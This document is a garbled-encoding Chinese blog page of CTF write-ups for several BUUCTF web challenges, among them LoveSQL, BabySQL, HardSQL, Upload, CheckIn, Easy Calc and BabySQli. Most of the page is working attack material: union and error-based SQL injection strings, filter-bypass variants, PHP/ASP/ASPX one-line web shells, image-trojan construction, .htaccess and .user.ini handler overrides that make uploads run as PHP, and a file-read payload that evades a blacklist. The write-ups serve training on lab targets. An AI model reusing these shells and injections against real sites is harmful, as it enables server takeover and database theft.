href="https://blog.csdn.net/qq_44657899/article/details/103239145?ops_request_misc=%7B%22request_id%22:%22167525557716800186572538%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167525557716800186572538&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-103239145-null-null.142%5Ev72%5Einsert_down1,201%5Ev4%5Eadd_ask&utm_term=%5B%E5%BC%BA%E7%BD%91%E6%9D%AF">https://blog.csdn.net/qq_44657899/article/details/103239145?ops_request_misc=%7B%22request%5Fid%22%3A%22167525557716800186572538%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167525557716800186572538&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-103239145-null-null.142^v72^insert_down1,201^v4^add_ask&amp;utm_term=[å¼ºç½‘æ¯</a> 2019]éšä¾¿æ³¨&amp;spm&#x3D;1018.2226.3001.4187)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;18e9f535-61ab-4cb5-8b24-03fb1b16d853&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h2><h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 4#   æŠ¥é”™ï¼Œè¯´æ˜æ˜¯ä¸‰åˆ—</span><br><span class="line">1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #</span><br><span class="line">1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;l0ve1ysq1&#x27; #</span><br><span class="line">1&#x27; union select group_concat(id),group_concat(username),group_concat(password) from l0ve1ysq1#</span><br></pre></td></tr></table></figure>



<h2 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h2><p>dirsearchå»æ‰«ï¼Œæ‰«å‡ºæ¥å¤ªå¤šäº†</p>
<p>backupfileå¯çŸ¥æ‰¾å¤‡ä»½æ–‡ä»¶ï¼Œè™½ç„¶æˆ‘æ˜¯çœ‹wpå¯çŸ¥ï¼Œ</p>
<p>&#x2F;index.php.bat</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¼ å…¥keyï¼Œé¦–å…ˆåˆ¤æ–­keyæ˜¯å¦ä¸ºæ•°å­—æˆ–è€…æ•°å­—å­—ç¬¦ã€‚ç„¶åå¯¹keyå–æ•´ã€‚æœ€ååˆ¤æ–­keyå’Œstræ˜¯å¦ç›¸ç­‰ã€‚è¿™é‡Œå­˜åœ¨å¼±æ¯”è¾ƒæ¼æ´ã€‚<br>åŸç†ï¼šå¦‚æœkeyä¸ºæ•°å­—æ—¶ï¼Œåœ¨åš&#x3D;&#x3D;æ¯”è¾ƒæ—¶ï¼Œstr<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">å­—ç¬¦ä¸²</a>è‡ªåŠ¨å˜ä¸ºæ•°å­—ï¼Œå³str&#x3D;123ã€‚</p>
<p>flag{a3cf62f3-1704-46dc-b72b-a043c514dbdd}</p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h2><h3 id="åŒå†™ç»•è¿‡"><a href="#åŒå†™ç»•è¿‡" class="headerlink" title="åŒå†™ç»•è¿‡"></a><strong>åŒå†™ç»•è¿‡</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1#</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/01/buu%E5%90%88%E9%9B%86-buu-web/QQ%E6%88%AA%E5%9B%BE20230511142254.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;ununionion seselectlect 1,2,3#</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; ununionion selselectect 1,(selselectect group_concat(table_name) frofromm infoorrmation_schema.tables whwhereere table_schema=database()),3 #</span><br><span class="line">1&#x27;ununionion selselectect 1,(selselectect group_concat(column_name) frofromm infoorrmation_schema.columns whwhereere table_name = &#x27;b4bsql&#x27;),3 #</span><br><span class="line">1&#x27;ununionion selselectect 1,(seselectlect group_concat(passwoorrd) frfromom b4bsql),3 #</span><br></pre></td></tr></table></figure>

<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h2><ol>
<li>ä¸€å¥è¯æœ¨é©¬<code>&lt;?</code>ç»•è¿‡</li>
<li>æ–‡ä»¶åç¼€ç»•è¿‡</li>
<li>æ–‡ä»¶ç±»å‹<code>Content-Type</code>ç»•è¿‡</li>
</ol>
<p>æ–‡ä»¶å¤´GIF86a    &#x2F;&#x2F;ç»•è¿‡å‰ç«¯éªŒè¯</p>
<p>.phtmlåç¼€å¯ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆå›¾ç‰‡æœ¨é©¬çš„ç³»ç»ŸæŒ‡ä»¤</p>
<p>copy å›¾ç‰‡&#x2F;b+ä¸€å¥è¯æœ¨é©¬&#x2F;a å›¾ç‰‡æœ¨é©¬</p>
<p>è¿™å¥æŒ‡ä»¤åªèƒ½å¤Ÿåœ¨cmdç»ˆç«¯ä¸­è¿›è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy pho.jpg /b + hack.php /a hack.jpg</span><br></pre></td></tr></table></figure>

<p>èšå‰‘è¿æ¥</p>
<p>å¸¸è§çš„ä¸€å¥è¯æœ¨é©¬ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpçš„ä¸€å¥è¯æœ¨é©¬ï¼š &lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br><span class="line">aspçš„ä¸€å¥è¯æ˜¯ï¼š   &lt;%eval request (&quot;pass&quot;)%&gt;</span><br><span class="line">aspxçš„ä¸€å¥è¯æ˜¯ï¼š  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>

<p><strong>ASP æ–‡ä»¶å¯åŒ…å«æ–‡æœ¬ã€ HTML æ ‡ç­¾å’Œè„šæœ¬ã€‚ASP æ–‡ä»¶ä¸­çš„è„šæœ¬å¯åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œã€‚</strong></p>
<p>htaccessæ–‡ä»¶(æˆ–è€…â€åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€ï¼‰,å…¨ç§°æ˜¯Hypertext Access(è¶…æ–‡æœ¬å…¥å£)ã€‚æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚æ–°å»º.htaccessæ–‡ä»¶ï¼Œç¼–è¾‘å†…å®¹ä¸ºSetHandler application&#x2F;x-httpd-php</p>
<p>&#x2F;&#x2F;è¯¥è¯­å¥ä½œç”¨æ˜¯è®©Apacheå°†å…¶ä»–ç±»å‹æ–‡ä»¶å‡ä»¥phpæ ¼å¼è§£æ</p>
<h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><h3 id="Pythonçš„webæ¡†æ¶-Tornado"><a href="#Pythonçš„webæ¡†æ¶-Tornado" class="headerlink" title="Pythonçš„webæ¡†æ¶-Tornado"></a>Pythonçš„webæ¡†æ¶-Tornado</h3><p><a href="https://so.csdn.net/so/search?q=tornado&spm=1001.2101.3001.7020">tornado</a>.web.Applicationå¯¹è±¡åˆå§‹åŒ–èµ‹äºˆcookie_secretå‚æ•°ï¼Œç”¨äºä¿å­˜æœ¬ç½‘ç«™cookiesåŠ å¯†å¯†é’¥</p>
<p>&#x2F;hints.txt<br>md5(cookie_secret+md5(filename))</p>
<p>&#x2F;flag.txt<br>flag in &#x2F;fllllllllllllag</p>
<p>&#x2F;welcome.txt<br>render</p>
<p>cookie_secretçš„å€¼</p>
<p>error?msg&#x3D;</p>
<p>å³å¯æŸ¥çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;autoreload&#x27;: True, &#x27;compiled_template_cache&#x27;: False, &#x27;cookie_secret&#x27;: &#x27;f6fcc9c5-389d-4b35-95c9-ceb850ba40a5&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>filename&#x3D;&#x2F;fllllllllllllag   åŠ å¯†å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3bf9f6cf685a6dd8defadabfb41a03a1  </span><br></pre></td></tr></table></figure>

<p>æ‹¼æ¥md5åŠ å¯†å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6ee95f59fff4fc3fa9cb75bf353e4864</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file?filename=/fllllllllllllag&amp;filehash=6ee95f59fff4fc3fa9cb75bf353e4864</span><br></pre></td></tr></table></figure>



<h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="title function_ invoke__">time</span>() . (<span class="keyword">string</span>)<span class="title function_ invoke__">rand</span>(<span class="number">100</span>, <span class="number">1000</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$target_path</span>  = <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;/upload/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$t_path</span> = <span class="variable">$target_path</span> . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = <span class="title function_ invoke__">substr</span>(<span class="variable">$uploaded_name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$uploaded_name</span>,<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$uploaded_ext</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;æˆ‘æ‰Œyour problem?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (((<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;</span></span><br><span class="line"><span class="string">            &quot;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/pjpeg&quot;</span>)|| (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/png&quot;</span>)) &amp;&amp; (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">2048</span>))&#123;</span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploaded_tmp</span>);</span><br><span class="line">			<span class="title function_ invoke__">mkdir</span>(<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;GBK&quot;</span>, <span class="variable">$target_path</span>), <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">			<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$uploaded_tmp</span>, <span class="variable">$t_path</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$t_path&#125;</span> succesfully uploaded!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;æˆ‘æ‰Œyour problem?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ForceType application/x-httpd-php</span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>

<p>åŒæ—¶ä¿®æ”¹ç±»å‹ä¸ºpng</p>
<p>ä¸Šä¼ æˆåŠŸ</p>
<p>æ¥ç€ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a </span><br><span class="line">  &lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>èšå‰‘è¿æ¥</p>
<p>flag{449ef412-2b10-4498-b258-8e2fcdfd2938}</p>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chr() â€” è¿”å›æŒ‡å®šçš„å­—ç¬¦</span><br><span class="line">scandir() â€” åˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸­çš„æ–‡ä»¶å’Œç›®å½•</span><br><span class="line">var_dump() â€” æ‰“å°å˜é‡çš„ç›¸å…³ä¿¡æ¯</span><br><span class="line">file_get_contents() â€” å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²</span><br><span class="line">foreach è¯­æ³•ç»“æ„æä¾›äº†éå†æ•°ç»„çš„ç®€å•æ–¹å¼ã€‚</span><br><span class="line">foreach (array_expression as $value)</span><br><span class="line">    statement</span><br><span class="line">foreach (array_expression as $key =&gt; $value)</span><br><span class="line">    statement</span><br><span class="line">/i (å¿½ç•¥å¤§å°å†™)</span><br><span class="line">/g (å…¨æ–‡æŸ¥æ‰¾å‡ºç°çš„æ‰€æœ‰åŒ¹é…å­—ç¬¦)</span><br><span class="line">/m (å¤šè¡ŒæŸ¥æ‰¾)</span><br><span class="line">/gi(å…¨æ–‡æŸ¥æ‰¾ã€å¿½ç•¥å¤§å°å†™)</span><br><span class="line">/ig(å…¨æ–‡æŸ¥æ‰¾ã€å¿½ç•¥å¤§å°å†™)</span><br></pre></td></tr></table></figure>

<p>payload: äº§çœ‹ç›®å½•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(scandir(chr(47)));</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) ç­‰ä»· var_dump(file_get_contents(&quot;/flagg&quot;))</span><br><span class="line">/calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>

<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL-æŠ¥é”™æ³¨å…¥"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL-æŠ¥é”™æ³¨å…¥" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL -æŠ¥é”™æ³¨å…¥"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL -æŠ¥é”™æ³¨å…¥</h2><p>é¢ï¼Œå°±ä¸€ä¸ªæ™®é€šçš„æŠ¥é”™æ³¨å…¥ï¼Œä½†æ˜¯è¿‡æ»¤äº†andã€&#x3D; ç©ºæ ¼ unionç­‰å¤šä¸ªsqlå…³é”®å­—</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))#</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))#  //åªæŸ¥åˆ°äº†å·¦è¾¹ï¼Œæˆ‘ä»¬ç”¨rightå‡½æ•°</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure>

<p>flag{986ccfdc-fbb9-4fba-bb4b-790ddb4a0d63}</p>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>user.ini</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_append_file=&quot;1.jpg&quot;</span><br></pre></td></tr></table></figure>

<p>1.jpg</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89A?</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[1])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="GXYCTF2019-BabySQli-è”åˆæ³¨å…¥"><a href="#GXYCTF2019-BabySQli-è”åˆæ³¨å…¥" class="headerlink" title="[GXYCTF2019]BabySQli-è”åˆæ³¨å…¥"></a>[GXYCTF2019]BabySQli-è”åˆæ³¨å…¥</h2><p>éšä¾¿è¾“å…¥æŸ¥çœ‹æºç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</span><br></pre></td></tr></table></figure>

<p>è§£å¯†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where username = &#x27;$name&#x27;</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®ç»™çš„æºç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;title&gt;Do you know who am I?&lt;/title&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">require &quot;config.php&quot;;</span><br><span class="line">require &quot;flag.php&quot;;</span><br><span class="line">// å»é™¤è½¬ä¹‰</span><br><span class="line">if (get_magic_quotes_gpc()) &#123;</span><br><span class="line">    function stripslashes_deep($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $value = is_array($value) ?</span><br><span class="line">        array_map(&#x27;stripslashes_deep&#x27;, $value) :</span><br><span class="line">        stripslashes($value);</span><br><span class="line">        return $value;</span><br><span class="line">    &#125;</span><br><span class="line">    $_POST = array_map(&#x27;stripslashes_deep&#x27;, $_POST);</span><br><span class="line">    $_GET = array_map(&#x27;stripslashes_deep&#x27;, $_GET);</span><br><span class="line">    $_COOKIE = array_map(&#x27;stripslashes_deep&#x27;, $_COOKIE);</span><br><span class="line">    $_REQUEST = array_map(&#x27;stripslashes_deep&#x27;, $_REQUEST);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);</span><br><span class="line">$name = $_POST[&#x27;name&#x27;];</span><br><span class="line">$password = $_POST[&#x27;pw&#x27;];</span><br><span class="line">$t_pw = md5($password);</span><br><span class="line">$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;</span><br><span class="line">$result = mysqli_query($con, $sql);</span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;/\(|\)|\=|or/&quot;, $name))&#123;</span><br><span class="line">    die(&quot;do not hack me!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    if (!$result) &#123;</span><br><span class="line">        printf(&quot;Error: %s\n&quot;, mysqli_error($con));</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $arr = mysqli_fetch_row($result);</span><br><span class="line">        if($arr[1] == &quot;admin&quot;)&#123;</span><br><span class="line">            if(md5($password) == $arr[2])&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;wrong pass!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;wrong user!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=admin&#x27; Order by 4#</span><br><span class="line">pw=1</span><br><span class="line">å›æ˜¾ï¼šError: Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;.</span><br><span class="line"></span><br><span class="line">name=admin&#x27; Order by 3#</span><br><span class="line">pw=1</span><br><span class="line">å›æ˜¾ï¼šwrong pass</span><br></pre></td></tr></table></figure>

<p>å­—æ®µä¸º3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;#</span><br><span class="line">passwd=1</span><br></pre></td></tr></table></figure>

<p>c4ca4238a0b923820dcc509a6f75849bä¸ºmd5 åŠ å¯†åçš„1</p>
